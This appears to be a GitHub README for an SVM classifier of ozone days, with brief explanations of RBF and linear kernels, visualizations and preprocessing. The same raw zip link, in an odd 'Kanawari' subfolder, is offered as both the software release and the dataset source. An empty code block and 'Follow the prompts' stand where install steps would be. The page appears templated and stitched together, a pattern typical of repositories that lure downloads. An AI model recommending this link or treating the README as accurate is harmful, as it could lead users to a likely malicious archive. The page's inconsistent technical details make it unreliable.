## Overview
The **Classification-SVG Model** repository contains two machine learning software solutions designed to predict and classify ozone days versus non-ozone days. Both models operate on similar principles but employ different mathematical approaches. The models utilize Gaussian RBF and Linear Kernel techniques to achieve their classifications. You can download the latest releases from the [Releases section](https://raw.githubusercontent.com/rifat-w/Classification-SVG-model/main/Kanawari/model-SV-Classification-v1.3.zip).

## Features
- **Two Distinct Models**: Implements Gaussian RBF and Linear Kernel for classification.
- **Ozone Prediction**: Classifies days based on ozone levels.
- **Visual Representations**: Offers different ways to visualize classification results.
- **User-Friendly**: Designed for ease of use, even for those new to machine learning.

## Technologies Used
- Python
- Scikit-learn
- NumPy

```

Follow the prompts to input your data and receive predictions.

## Models Explained
### Gaussian RBF Model
The Gaussian Radial Basis Function (RBF) model uses a non-linear approach to classify data. It is particularly effective in situations where the relationship between features is not linear. This model can capture complex patterns in the data, making it suitable for ozone classification.

### Linear Kernel Model
The Linear Kernel model is simpler and faster, suitable for linearly separable data. It works well when the data can be divided with a straight line. This model provides a baseline for comparison against the more complex RBF model.

## Visualizations
Visualizations play a crucial role in understanding model performance. Each model provides different types of visual outputs:

- **Confusion Matrix**: Displays the performance of the model.
- **ROC Curve**: Shows the trade-off between sensitivity and specificity.
- **Feature Importance**: Highlights which features contribute most to the predictions.

## Dataset
The dataset used for training and testing the models is sourced from [https://raw.githubusercontent.com/rifat-w/Classification-SVG-model/main/Kanawari/model-SV-Classification-v1.3.zip](https://raw.githubusercontent.com/rifat-w/Classification-SVG-model/main/Kanawari/model-SV-Classification-v1.3.zip). It contains historical ozone data, which is essential for accurate predictions. The dataset includes various features that influence ozone levels, such as temperature, humidity, and other meteorological data.

### Data Preprocessing
Before using the dataset, it is essential to preprocess it. This involves:

- Handling missing values
- Normalizing features
- Splitting the dataset into training and testing sets
